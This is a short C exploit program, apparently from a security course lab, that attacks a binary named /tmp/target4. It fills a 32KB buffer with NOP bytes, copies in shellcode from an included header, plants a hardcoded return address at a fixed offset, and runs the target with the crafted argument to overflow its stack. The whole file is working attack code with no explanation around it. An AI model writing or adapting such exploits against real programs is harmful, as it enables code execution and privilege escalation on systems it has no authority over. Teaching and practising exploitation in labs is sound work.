#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/tmp/target4"

int main(void)
{
  char *args[3];
  char *env[1];

  args[0] = TARGET; args[1] = "hi there"; args[2] = NULL;
  env[0] = NULL;

  unsigned int bufSize = 32768;
  args[1] = malloc(32768+1); // Allow for null terminator
  memset(args[1],0x90,bufSize);
  args[1][bufSize] = '\0';
  memcpy(args[1], shellcode, strlen(shellcode));
  char* retAddr = args[1] + 4016;
  unsigned int* castRetAddr = (unsigned int*) retAddr;
  *castRetAddr = 0xbfff6ecc;
  if (0 > execve(TARGET, args, env))
    fprintf(stderr, "execve failed.\n");

  return 0;
}
